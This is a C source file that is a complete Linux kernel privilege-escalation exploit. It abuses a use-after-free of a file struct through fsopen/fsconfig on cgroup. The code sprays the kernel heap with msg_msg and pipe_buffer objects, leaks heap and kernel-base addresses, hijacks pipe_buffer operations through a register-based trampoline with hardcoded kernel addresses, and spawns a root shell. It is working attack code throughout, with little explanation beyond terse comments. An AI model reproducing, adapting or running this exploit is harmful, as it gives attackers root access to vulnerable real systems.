#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <signal.h>
#include <assert.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/socket.h>

#include "libexp.h"

#define __NR_fsconfig 431
#define __NR_fsopen 430
#define FSCONFIG_SET_FD 5

int fd1, fd2, fd3, fd4, fd5, fd6;
int msgqid;
char payload[0x1200-0x30-8];
char payload2[0x200-0x30];

#define SPRAY_NUM 0x40
#define SPRAY_NUM2 0x140
#define PIPE_SPRAY_NUM 0x100
#define CRASH_ADDR 0xffffffff81665d8f
int fds[SPRAY_NUM];
int fds2[SPRAY_NUM2];
int pipe_fds[PIPE_SPRAY_NUM*2];

int *crash;
int *success;

/******************************************************************/
/*************************AUTO GENERATED***************************/
#define _GNU_SOURCE
#ifndef va_start
#include <stdarg.h>
#endif
#ifndef assert
#include <assert.h>
#endif
#ifndef signal
#include <signal.h>
#endif
#ifndef sched_setaffinity
#include <sched.h>
#endif

// we need this because rcx may not be restored in the trampoline
// so it will crash during kernel-user switch
void get_shell(int signum) {
    printf("uid: %d\n", getuid());
    system("/bin/sh");
    while(1);
}

void __attribute__((constructor)) _ret2reg_init() {
    signal(SIGSEGV, get_shell);
}

unsigned long _args[6];
unsigned long _arg_num = 0;
void __trigger()
{

    __asm__(".intel_syntax noprefix;"
            "push rbp;"

            "mov rcx, %0;"
            "mov rdi, [rcx+8*0];"
            "mov rsi, [rcx+8*1];"
            "mov rdx, [rcx+8*2];"
            "mov r10, [rcx+8*3];"
            "mov r8, [rcx+8*4];"
            "mov r9, [rcx+8*5];"

                        "mov rbp, 0xffffffff81000737;"
                        "mov rbx, 0xffffffff82e53590;"
                        "mov r10, 0xffffffff810e1de0;"
                        "mov r9, 0xffffffff81e00100;"

            "mov rax, 0;"
            "syscall;"
            "pop rbp;"
            ".att_syntax;"
            : : "r"(_args));
}

void _trigger(int num_args, ...)
{
    va_list ap;
    va_start(ap, num_args);
    for(int i=0; i<num_args; i++) {
        _args[_arg_num++] = va_arg(ap, unsigned long);
    }
    va_arg(ap, unsigned long);
    va_end(ap);

    __asm__(".intel_syntax noprefix;"
            "call __trigger;"
            ".att_syntax;");
    _arg_num = 0;
    if(getuid() == 0) get_shell(0);
}

#define NUMARGS(...)  (sizeof((unsigned long[]){__VA_ARGS__})/sizeof(unsigned long))
#define ret2reg_trigger(...) _trigger(NUMARGS(__VA_ARGS__), __VA_ARGS__ )
/*************************AUTO GENERATED***************************/
/******************************************************************/

int identify_msg_once(struct msg_spray_t *spray)
{
	char buffer[sizeof(payload)+0x10];
	long *ptr = &buffer[0x1000-0x30];// first 0x1000-0x30 bytes are irrelevant
	int found = 0;
	int ret;

	// puts("identify_msg_once");

	memset(buffer, 0, sizeof(buffer));

	for(int i=0; i<spray->num; i++) {
		ret = msgrcv(spray->msgqid, buffer, spray->len, 0, MSG_NOERROR | IPC_NOWAIT | MSG_COPY);
		assert(ret >= 0);
		for(int i=0; i<(0x200-8)/8; i++) {
			if(ptr[i] != 0x4343434343434343) {
				return 1;
			}
		}
		ret = msgrcv(spray->msgqid, buffer, spray->len, 0, MSG_NOERROR | IPC_NOWAIT);
		assert(ret >= 0);
	}
	return 0;
}

int identify_msg(struct msg_spray_t *spray)
{
	while(spray != NULL) {
		// puts("identify_msg");
		// printf("%p\n", spray);
		int found = identify_msg_once(spray);
		if(found) {
			break;
		}
		spray = spray->next;
	}

	assert(spray != NULL);

	return spray->msgqid;
}

void exploit(void)
{
	// // clear other objects in the same cache as our victim object
	// // the target slab will be added to cpu_partial
	// ioctl(fd3, 0x41414141, 0x42424242);
	for(int i=0; i<SPRAY_NUM; i++) close(fds[i]);
	usleep(100000);

	// force the kernel to drain cpu_partial
	for(int i=0; i<SPRAY_NUM2; i++) {
		if(i % 2 == 0) close(fds2[i]);
	}
	usleep(100000);

	// now free UAF file struct, which is the last object in the slab
	// now the slab is empty and unfrozen, should be discarded now
	ioctl(fd3, 0x41414141, 0x42424242);
	ts_fence();
	close(fd1);

	// reclaim the freed slab pages
	struct msg_spray_t *spray = msg_spray(payload, sizeof(payload), 0x200);

	// dup fd so one value will get increased by 1 so we can identify this
	dup(fd3);

	// now identify the message overlapping with the target struct file by
	// 1. peek into the message, check whether it is the target message
	// 2. if it is not the target message, free it
	// 3. if it is the target message, break
	// 4. identify the offset => where the target struct starts
	// 5. if the target struct file lies across two messages, we abort the exploitation
	int msgqid = identify_msg(spray);
	puts("Found target message!");
	char buffer[sizeof(payload)+0x10];
	long *ptr = &buffer[0x1000-0x30];// first 0x1000-0x30 bytes are irrelevant
	msgrcv(msgqid, buffer, spray->len, 0, MSG_NOERROR | IPC_NOWAIT | MSG_COPY);
	int offset = -1;
	for(int i=0; i<(0x200-8)/8; i++) {
		if(ptr[i] != 0x4343434343434343) offset = i*8 - 0x50;// offset of f_count
	}
	printf("offset: %#x\n", offset);
	sleep(1);
	assert(offset <= 0xc0);
	assert(offset > 0);

	// now we are sure the page is reclaimed, close all useless files
	for(int i=0; i<SPRAY_NUM2; i++) close(fds2[i]);

	// free the file struct the second time and reclaim it with a msg_msg struct
	memset(&payload[8], 0x42, sizeof(payload));
	ts_fence();
	close(fd2);
	struct msg_spray_t *spray2 = msg_spray(payload, 0x108-0x30, 0x40);

	// now read the msg_msg header to leak a heap address that is in our control
	u64 heap_ptr = 0;
	u64 heap_ptr2 = 0;
	msgrcv(msgqid, buffer, spray->len, 0, MSG_NOERROR | IPC_NOWAIT | MSG_COPY);
	for(int i=0; i<(0x200-8)/8; i++) {
		if(ptr[i] == 0x4141414141414141)  {
			heap_ptr = ptr[i-2];
			heap_ptr2 = ptr[i-1];
		}
	}
	printf("heap_ptr: %#llx\n", heap_ptr);
	printf("heap_ptr2: %#llx\n", heap_ptr2);

	// now free the inner msg_msg and replace it with pipe_buffer
	for(int i=0; i<PIPE_SPRAY_NUM; i++) pipe(&pipe_fds[i*2]);
	ts_fence();
	close(fd4);
	for(int i=0; i<PIPE_SPRAY_NUM; i++) {
		fcntl(pipe_fds[i], F_SETPIPE_SZ, 7*0x1000);
	}
	void *tmp = malloc(0xa800);
	for(int i=0; i<PIPE_SPRAY_NUM; i++) {
		write(pipe_fds[i], tmp, 0x6800);
	}

	// peek into it to leak kernel code base
	msgrcv(msgqid, buffer, spray->len, 0, MSG_NOERROR | IPC_NOWAIT | MSG_COPY);
	u64 leak_val = ptr[(offset+0x10)/8];
	printf("leak_val: %#llx\n", leak_val);
	u64 code_base = leak_val - 0xffffffff82582040 + 0xffffffff81000000;
	printf("code_base: %#llx\n", code_base);

	// free inner msg and prepare pipe_buffer->ops vtable
	long *ptr2 = (long *)payload2;
	for(int i=1; i<sizeof(payload2)/8; i++) {
		ptr2[i] = CRASH_ADDR;
	}

	memset(payload2, 0x41, 8);
	close(fd5);
	msg_spray(payload2, 0x130-0x30, 0x100);

	// peek into it to leak fops addr
	msgrcv(msgqid, buffer, spray->len, 0, MSG_NOERROR | IPC_NOWAIT | MSG_COPY);
	u64 fops_addr = ptr[offset/8]+0x30;
	printf("fops addr: %#llx\n", fops_addr);

	// free the outer msg to overwrite fops
	msgrcv(msgqid, buffer, spray->len, 0, MSG_NOERROR | IPC_NOWAIT);
	ptr2 = (long *)payload2;
	for(int i=1; i<sizeof(payload2)/8; i++) {
		ptr2[i] = fops_addr;
	}
	msg_spray(payload2, 0x200-0x30, 0x100);

	puts("before trigger...");
	// sleep(1);
	// getchar();
	// trigger
	for(int i=0; i<PIPE_SPRAY_NUM; i++) {
		// read(pipe_fds[i], NULL, 1);
		ret2reg_trigger(pipe_fds[i], NULL, 1);
	}
	// close(fd3);
}

void context_setup()
{
	// defragmentation
	for(int i=0; i<0x280; i++) open("/etc/passwd", O_RDONLY);

	fd1 = syscall(__NR_fsopen, "cgroup", 0ul);
	fd2 = syscall(__NR_fsopen, "cgroup", 0ul);
	fd4 = syscall(__NR_fsopen, "cgroup", 0ul);
	fd5 = syscall(__NR_fsopen, "cgroup", 0ul);
	fd6 = syscall(__NR_fsopen, "cgroup", 0ul);
	//assert(fd1 >= 0);

	// prepare heap layout, force the victim struct file to be surrounded by spray objects
	for(int i=0; i<SPRAY_NUM/2; i++) fds[i] = open("/dev/null", O_RDONLY);
	fd3 = syscall(__NR_open, "/proc/mtrr", O_RDONLY);
	for(int i=0; i<SPRAY_NUM/2; i++) fds[SPRAY_NUM/2+i] = open("/dev/null", O_RDONLY);

	// do a second spray for later unfreezing
	for(int i=0; i<SPRAY_NUM2; i++) fds2[i] = open("/dev/null", O_RDONLY);

	// trigger vulnerability
	syscall(__NR_fsconfig, fd1, FSCONFIG_SET_FD, "source", NULL, fd3);
	syscall(__NR_fsconfig, fd2, FSCONFIG_SET_FD, "source", NULL, fd3);
	syscall(__NR_fsconfig, fd4, FSCONFIG_SET_FD, "source", NULL, fd3);
	syscall(__NR_fsconfig, fd5, FSCONFIG_SET_FD, "source", NULL, fd3);
	syscall(__NR_fsconfig, fd6, FSCONFIG_SET_FD, "source", NULL, fd3);
}

void payload_setup()
{
	long *ptr = (long *)payload;
	for(int i=0; i<sizeof(payload)/8; i++) {
		ptr[i] = 0x4343434343434343;
	}

	memset(payload, 'A', 0x10);
}

void handle_sig(int sig)
{
    printf("Caught signal %d\n", sig);
	puts("sleep!");
	*crash = 1;
	sleep(10000);
}

void attempt(void)
{
	signal(SIGABRT, handle_sig);
	set_cpu(0);
	context_setup();
	payload_setup();
	exploit();
}

void main(void)
{
	setup_sandbox();
	crash = (int *)umem_alloc(NULL, 0x1000);
	success = crash + 1;
	*success = 0;
	while(*success == 0) {
		*crash = 0;
		if(!fork()) {
			attempt();
		}
		while(*crash == 0) {
			usleep(100000);
		}
	}

	exit(0);
}
